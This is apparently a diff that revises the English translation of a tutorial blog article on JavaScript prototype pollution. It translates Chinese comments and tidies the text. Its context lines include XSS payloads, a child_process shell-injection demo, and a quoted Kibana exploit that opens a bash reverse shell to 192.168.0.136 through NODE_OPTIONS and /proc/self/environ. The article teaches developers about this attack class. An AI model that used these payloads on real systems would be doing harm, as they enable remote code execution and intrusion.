@@ -96,7 +96,7 @@ First, I added a method called `first` to `String.prototype`. So when I call `""
 
 Due to the rules of `this`, when `"".first()` is written, the `this` inside `first` will be `""`. If `"abc".first()` is called, the `this` inside `first` will be `"abc"`. Therefore, we can use `this` to differentiate who is calling it.
 
-The way `String.prototype.first` is written above directly modifies the prototype of `String`, adding a new method that can be used by all strings. Although it is convenient, this approach is not recommended in development. There is a saying: [Don't modify objects you don't own](https://humanwhocodes.com/blog/2010/03/02/maintainable-javascript-dont-modify-objects-you-down-own/). For example, MooTools did something similar, which resulted in a change of name for an array method. You can find more details in my previous article: [Don’t break the Web: A case study on SmooshGate and keygen](https://blog.huli.tw/2019/11/26/dont-break-web-smooshgate-and-keygen/).
+The way `String.prototype.first` is written above directly modifies the prototype of `String`, adding a new method that can be used by all strings. Although it is convenient, this approach is not recommended in development. There is a saying: [Don't modify objects you don't own](https://humanwhocodes.com/blog/2010/03/02/maintainable-javascript-dont-modify-objects-you-down-own/). For example, MooTools did something similar, which resulted in a change of name for an array method. You can find more details in my previous article: [Don’t break the Web: A case study on SmooshGate and keygen](https://blog.huli.tw/2019/11/26/en/dont-break-web-smooshgate-and-keygen/).
 
 Furthermore, since `String.prototype` can be modified, it is natural that `Object.prototype` can also be modified, like this:
 
@@ -121,16 +121,15 @@ Let's say there is a search function on a website that retrieves the value of `q
 The code for this functionality is written as follows:
 
 ``` js
-// 從網址列上拿到 query string
+// get query string
 var qs = new URLSearchParams(location.search.slice(1))
 
-// 放上畫面，為了避免 XSS 用 innerText
+// put it on the screen and use innerText to avoid XSS
 document.body.appendChild(createElement({
   tag: 'h2',
   innerText: `Search result for ${qs.get('q')}`
 }))
 
-// 簡化建立元件用的函式
 function createElement(config){
   const element = document.createElement(config.tag)
   if (config.innerHTML) {
@@ -147,10 +146,10 @@ The code above seems fine, right? We wrote a function `createElement` to simplif
 It appears to be correct, but what if there was a prototype pollution vulnerability before executing this code that allowed an attacker to pollute properties on the prototype? For example, something like this:
 
 ``` js
-// 先假設可以污染原型上的屬性
+// Assumed we can do prototype pollution
 Object.prototype.innerHTML = '<img src=x onerror=alert(1)>'
 
-// 底下都跟剛剛一樣
+// Below is the same as before
 var qs = new URLSearchParams(location.search.slice(1))
 
 document.body.appendChild(createElement({
@@ -160,7 +159,7 @@ document.body.appendChild(createElement({
 
 function createElement(config){
   const element = document.createElement(config.tag)
-  // 這一行因為原型鏈被污染，所以 if(config.innerHTML) 的結果會是 true
+  // if(config.innerHTML) will be true because of the polluted innerHTML
   if (config.innerHTML) {
     element.innerHTML = config.innerHTML
   } else {
@@ -195,12 +194,12 @@ function parseQs(qs) {
   for(let item of arr) {
     let [key, value] = item.split('=')
     if (!key.endsWith(']')) {
-      // 針對一般的 key=value
+      // for a normal key-value pair
       result[key] = value
       continue
     }
 
-    // 針對物件
+    // for object
     let items = key.split('[')
     let obj = result
     for(let i = 0; i < items.length; i++) {
@@ -356,7 +355,7 @@ These "code snippets that can be exploited if we pollute the prototype" are call
     {{ message }}
   </div>
   <script>
-    // 污染 template
+    // pollute template
     Object.prototype.template = '<svg onload=alert(1)></svg>';
     var app = new Vue({ 
       el: '#app',
@@ -430,7 +429,7 @@ However, if there is a prototype pollution vulnerability, it can transform into 
 ``` js
 const child_process = require('child_process')
 const params = ['123 && ls']
-Object.prototype.shell = true // 只多了這行，參數的解析就會不一樣
+Object.prototype.shell = true // I only add this line
 const result = child_process.spawnSync(
   'echo', params, {timeout: 1000}
 );
@@ -483,7 +482,7 @@ Some people may have seen a way to create objects like this: `Object.create(null
 
 ``` js
 var obj = Object.create(null)
-obj['__proto__']['a'] = 1 // 根本沒有 __proto__ 這個屬性
+obj['__proto__']['a'] = 1
 // TypeError: Cannot set property 'a' of undefined
 ```
 
@@ -520,10 +519,7 @@ Finally, let's take a look at two real-life examples of prototype pollution to g
 
 The first example is a vulnerability reported by vakzz to the well-known bug bounty platform hackerone in 2020 (yes, it's a vulnerability in the bug bounty platform itself). The complete report can be found here: [#986386 Reflected XSS on www.hackerone.com via Wistia embed code](https://hackerone.com/reports/986386)
 
-Here is the translated Markdown content:
-
-```
-In the website, a third-party package is used, and inside this package, there is a piece of code that looks like this:
+On the website, a third-party package is used, and inside this third-party package, there is a piece of code that looks like this:
 
 ``` js
 i._initializers.initWLog = function() {
@@ -582,7 +578,7 @@ console.log('a.js')
 // b.js
 console.log('b.js')
 
-// 跑這個指令，用環境變數引入 a.js
+// includes a.js via environment variables
 NODE_OPTIONS="--require ./a.js" node b.js
 
 // 輸出
@@ -590,7 +586,7 @@ a.js
 b.js
 ```
 
-Therefore, if we can upload a JavaScript file, we can execute that file in combination with prototype pollution. It may sound complicated, but is there another method?
+Therefore, if we can upload a JavaScript file, we can execute that file in combination with prototype pollution. It sounds complicated, is there another way?
 
 Yes! There is a commonly used technique where the content of certain files is controllable. For example, in PHP, the content of the session file can be controlled. You can refer to this article: [Exploiting RCE by Introducing PHP Session File via LFI](https://kb.hitcon.org/post/165429468072/%E9%80%8F%E9%81%8E-lfi-%E5%BC%95%E5%85%A5-php-session-%E6%AA%94%E6%A1%88%E8%A7%B8%E7%99%BC-rce). Another example is the file `/proc/self/environ` in Linux systems, which contains all the environment variables of the current process.
 
@@ -611,7 +607,6 @@ The code provided by the author is:
 ``` js
 .es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
 .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
-```
 ```
 
 Polluted two different properties, creating two environment variables, one to make `/proc/self/environ` a valid JavaScript and include the code to be executed, and the other `NODE_OPTIONS` to import `/proc/self/environ` through `--require`, resulting in an RCE vulnerability that allows arbitrary code execution!
@@ -661,5 +656,3 @@ Some people even automate the detection of prototype pollution vulnerabilities a
 When I first encountered this vulnerability, I had a feeling of "a whole new world." The concept of prototypes that everyone is familiar with in frontend development has become a common attack technique in the field of security. How did I not know about this before? And it's not just prototype pollution; there are many other vulnerabilities that give the same feeling.
 
 This is also one of the reasons why I wanted to write this series of articles, hoping to make more frontend and JavaScript developers aware of different attack techniques.
-
-(This article is adapted from a previous article I published: [基於 JS 原型鏈的攻擊手法：Prototype Pollution](https://blog.huli.tw/2021/09/29/prototype-pollution/))
